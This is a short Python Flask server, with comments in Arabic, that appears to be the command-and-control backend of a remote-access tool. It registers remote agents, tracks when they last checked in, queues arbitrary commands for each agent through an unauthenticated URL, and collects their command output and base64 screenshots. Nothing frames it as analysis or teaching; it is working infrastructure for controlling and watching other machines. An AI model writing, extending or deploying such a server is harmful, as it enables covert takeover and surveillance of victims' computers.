from flask import Flask, request, jsonify
import threading, time

app = Flask(__name__)

agents = {}      # agent_id -> {"last_seen", "info"}
tasks = {}       # طوابير الأوامر
results = {}     # النتائج
screen = {}      # آخر لقطة شاشة (base64) لكل وكيل
lock = threading.Lock()

@app.route("/register", methods=["POST"])
def register():
    d = request.get_json()
    aid = d["id"]
    with lock:
        agents[aid] = {"last_seen": time.time(), "info": d.get("info", {})}
        tasks.setdefault(aid, []); results.setdefault(aid, [])
    return jsonify({"ok": True})

@app.route("/task/<aid>", methods=["GET"])
def get_task(aid):
    with lock:
        if aid in agents: agents[aid]["last_seen"] = time.time()
        task = tasks[aid].pop(0) if tasks.get(aid) else None
    return jsonify(task or {"cmd": None})

@app.route("/result/<aid>", methods=["POST"])
def post_result(aid):
    d = request.get_json()
    with lock:
        if d.get("type") == "screen":
            screen[aid] = d.get("b64")     # لا نُراكم اللقطات — نستبدل الأخيرة فقط
        else:
            results.setdefault(aid, []).append(d)
    return jsonify({"ok": True})

@app.route("/screen/<aid>", methods=["GET"])
def get_screen(aid):
    with lock:
        return jsonify({"b64": screen.get(aid)})

@app.route("/send/<aid>/<path:cmd>", methods=["GET"])
def send_cmd(aid, cmd):
    with lock:
        tasks.setdefault(aid, []).append({"cmd": cmd})
    return jsonify({"ok": True})

@app.route("/results/<aid>", methods=["GET"])
def get_results(aid):
    with lock:
        out = results.get(aid, [])[:]; results[aid] = []
    return jsonify(out)

@app.route("/agents", methods=["GET"])
def list_agents():
    with lock:
        return jsonify({a: {"last_seen": v["last_seen"], "info": v["info"]}
                        for a, v in agents.items()})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
